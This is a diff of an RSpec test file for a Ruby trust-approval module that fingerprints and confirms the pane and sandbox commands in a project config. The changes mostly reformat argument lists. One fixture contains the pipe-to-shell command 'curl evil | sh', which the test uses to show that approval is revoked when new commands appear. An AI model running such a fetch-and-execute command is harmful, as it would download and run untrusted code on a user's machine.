@@ -14,11 +14,17 @@ RSpec.describe Orn::Trust do
   end
 
   def row_panes(*panes)
-    Orn::Config::Row.new(panes: panes, columns: [])
+    Orn::Config::Row.new(
+      panes: panes,
+      columns: []
+    )
   end
 
   def row_cols(*columns)
-    Orn::Config::Row.new(panes: [], columns: columns)
+    Orn::Config::Row.new(
+      panes: [],
+      columns: columns
+    )
   end
 
   def rows_layout(*rows)
@@ -30,13 +36,35 @@ RSpec.describe Orn::Trust do
       build = if build_args.empty?
                 nil
               else
-                Orn::Config::SbxBuild.new(dockerfile: nil,
-                  build_args: build_args)
+                Orn::Config::SbxBuild.new(
+                  dockerfile: nil,
+                  build_args: build_args
+                )
               end
     end
     Orn::Config::SbxConfig.new(
-      template: nil, kit: nil, kits: [], cpus: nil, memory: nil, agent_type: nil,
-      setup: setup, start: start, build: build, env: env, ports: [], columns: nil
+      template: nil,
+
+      kit: nil,
+
+      kits: [],
+
+      cpus: nil,
+
+      memory: nil,
+
+      agent_type: nil,
+      setup: setup,
+
+      start: start,
+
+      build: build,
+
+      env: env,
+
+      ports: [],
+
+      columns: nil
     )
   end
 
@@ -170,8 +198,12 @@ RSpec.describe Orn::Trust do
       path = File.join(dir, "approval")
       described_class.save_approval(path, described_class.commands_fingerprint(["vim"]))
 
-      expect(described_class.approved?(path,
-        described_class.commands_fingerprint(["vim", "curl evil | sh"]))).to be(false)
+      expect(
+        described_class.approved?(
+          path,
+          described_class.commands_fingerprint(["vim", "curl evil | sh"])
+        )
+      ).to be(false)
     end
 
     it "creates parent directories when saving" do
@@ -208,8 +240,13 @@ RSpec.describe Orn::Trust do
     def prompt(items, input)
       writer = StringIO.new
       result = described_class.confirm_prompt(
-        items, header: "Project config contains pane commands that will be executed:",
-        prompt: "Trust these commands? [y/N] ", reader: StringIO.new(input), writer: writer
+        items,
+        header: "Project config contains pane commands that will be executed:",
+        prompt: "Trust these commands? [y/N] ",
+
+        reader: StringIO.new(input),
+
+        writer: writer
       )
       [result, writer.string]
     end
@@ -326,7 +363,12 @@ RSpec.describe Orn::Trust do
     end
 
     it "is false when build has no build args" do
-      sbx = make_sbx(build: Orn::Config::SbxBuild.new(dockerfile: "Dockerfile", build_args: []))
+      sbx = make_sbx(
+        build: Orn::Config::SbxBuild.new(
+          dockerfile: "Dockerfile",
+          build_args: []
+        )
+      )
 
       expect(described_class.sbx_commands?(sbx)).to be(false)
     end
@@ -355,7 +397,13 @@ RSpec.describe Orn::Trust do
     end
 
     it "labels every field together in order" do
-      items = described_class.format_sbx_items(make_sbx(setup: ["setup.sh"], start: "start.sh", build_args: ["TOKEN"]))
+      items = described_class.format_sbx_items(
+        make_sbx(
+          setup: ["setup.sh"],
+          start: "start.sh",
+          build_args: ["TOKEN"]
+        )
+      )
 
       aggregate_failures do
         expect(items[0]).to include("[setup]")
@@ -371,7 +419,11 @@ RSpec.describe Orn::Trust do
 
   describe ".sbx_fingerprint" do
     it "is deterministic" do
-      sbx = make_sbx(setup: ["setup.sh"], start: "start.sh", build_args: ["KEY"])
+      sbx = make_sbx(
+        setup: ["setup.sh"],
+        start: "start.sh",
+        build_args: ["KEY"]
+      )
       first = described_class.sbx_fingerprint(sbx)
       second = described_class.sbx_fingerprint(sbx)
 
@@ -409,7 +461,13 @@ RSpec.describe Orn::Trust do
     end
 
     it "is 64 hex characters" do
-      fingerprint = described_class.sbx_fingerprint(make_sbx(setup: ["setup.sh"], start: "start", build_args: ["KEY"]))
+      fingerprint = described_class.sbx_fingerprint(
+        make_sbx(
+          setup: ["setup.sh"],
+          start: "start",
+          build_args: ["KEY"]
+        )
+      )
 
       expect(fingerprint).to match(/\A\h{64}\z/)
     end
